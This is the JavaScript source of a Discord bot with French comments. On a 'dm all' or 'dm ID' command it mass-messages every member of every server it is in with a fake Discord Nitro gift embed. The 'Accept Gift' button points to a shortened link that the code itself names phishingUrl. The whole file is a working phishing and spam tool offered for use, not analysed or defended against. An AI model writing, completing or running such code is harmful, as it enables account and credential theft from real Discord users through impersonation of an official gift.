const fs = require('fs');
const config = JSON.parse(fs.readFileSync('./config.json'));
const token = config.token;

const phishingUrl = "https://tinyurl.com/6c6b86en";
const imageUrl = "https://swiemali2-lgtm.github.io/member-cleanup/IMG_2560.jpeg";

let processed = new Set();
const startTime = Date.now(); // On note l'heure de démarrage pour ignorer les vieux messages

async function listen() {
  console.log("Bot en ligne. En attente de commandes (dm all / dm ID)...");
  
  setInterval(async () => {
    try {
      let res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {headers: {"Authorization": `Bot ${token}`}});
      let guilds = await res.json();
      if (!Array.isArray(guilds)) return;

      for (let g of guilds) {
        let chansRes = await fetch(`https://discord.com/api/v9/guilds/${g.id}/channels`, {headers: {"Authorization": `Bot ${token}`}});
        let chans = await chansRes.json();
        if (!Array.isArray(chans)) continue;

        for (let c of chans) {
          if (c.type !== 0) continue;
          
          let msgsRes = await fetch(`https://discord.com/api/v9/channels/${c.id}/messages?limit=5`, {headers: {"Authorization": `Bot ${token}`}});
          let msgs = await msgsRes.json();
          if (!Array.isArray(msgs)) continue;
          
          for (let m of msgs) {
            if (!m.content || processed.has(m.id)) continue;
            
            // Ignore les messages envoyés avant le démarrage
            const msgTime = new Date(m.timestamp).getTime();
            if (msgTime < (startTime - 10000)) {
               processed.add(m.id);
               continue;
            }

            const content = m.content.toLowerCase().trim();
            
            if (content === "dm all") {
              processed.add(m.id);
              console.log("Lancement du DM ALL...");
              dmAll();
            }
            
            if (content.startsWith("dm ") && content !== "dm all") {
              processed.add(m.id);
              const targetId = content.split(" ")[1];
              console.log("Envoi DM à :", targetId);
              sendDM(targetId);
            }
          }
        }
      }
    } catch (e) {
      console.log("Erreur de lecture, on continue...");
    }
  }, 5000);
}

async function sendDM(targetId) {
  try {
    let dm = await (await fetch(`https://discord.com/api/v9/users/@me/channels`, {method: "POST", headers: {"Authorization": `Bot ${token}`, "Content-Type": "application/json"}, body: JSON.stringify({recipient_id: targetId})})).json();
    if (!dm.id) return;
    
    let embed = {
      title: "You've been gifted a subscription!",
      description: `**100pression** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
      color: 0x5865f2,
      image: { url: imageUrl }
    };

    await fetch(`https://discord.com/api/v9/channels/${dm.id}/messages`, {
      method: "POST",
      headers: {"Authorization": `Bot ${token}`, "Content-Type": "application/json"},
      body: JSON.stringify({
        content: "",
        embeds: [embed],
        components: [
          {
            type: 1,
            components: [
              { type: 2, style: 5, label: "Accept Gift", url: phishingUrl },
              { type: 2, style: 5, label: "Learn More", url: "https://discord.com/nitro" }
            ]
          }
        ]
      })
    }).catch(()=>{});
    console.log(`Envoyé à ${targetId}`);
  } catch(e) {}
}

async function dmAll() {
  let contacted = new Set();
  let count = 0;

  try {
    let guildsRes = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {headers: {"Authorization": `Bot ${token}`}});
    let guilds = await guildsRes.json();
    
    for (let g of guilds) {
      let after = "0";
      while (true) {
        let res = await fetch(`https://discord.com/api/v9/guilds/${g.id}/members?limit=1000&after=${after}`, {headers: {"Authorization": `Bot ${token}`}});
        let batch = await res.json();
        
        if (batch.message || !batch.length) break;
        
        for (let m of batch) {
          if (m.user.bot || contacted.has(m.user.id)) continue;
          await sendDM(m.user.id);
          contacted.add(m.user.id);
          count++;
          await new Promise(r => setTimeout(r, 3000));
        }
        after = batch[batch.length - 1].user.id;
      }
    }
    console.log(`DM ALL FINI : ${count} messages envoyés.`);
  } catch (e) {}
}

// On lance l'écoute en boucle infinie
listen();